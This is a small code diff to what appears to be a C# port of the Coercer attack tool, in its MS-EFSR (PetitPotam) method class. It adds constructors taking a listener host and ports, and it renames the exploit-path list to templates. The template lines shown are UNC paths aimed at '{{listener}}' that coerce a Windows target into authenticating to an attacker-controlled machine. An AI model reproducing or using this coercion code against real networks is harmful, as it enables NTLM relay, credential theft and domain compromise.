@@ -4,8 +4,11 @@ namespace Coercer_dotnet.methods.MS_EFSR
 {
     public abstract class MS_EFSR : Method
     {
+        protected MS_EFSR(AuthType authType, string listener) : base(authType, listener) { }
+        protected MS_EFSR(AuthType authType, string listener, int port) : base(authType, listener, port) { }
+        protected MS_EFSR(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
         public override string Author => "@topotam77";
-        public override ExploitPath[] ExploitPaths => new ExploitPath[]
+        public override ExploitPathTemplate[] ExploitPathTemplates => new ExploitPathTemplate[]
         {
             new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\\file.txt\x00"),
             new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\\\x00"),
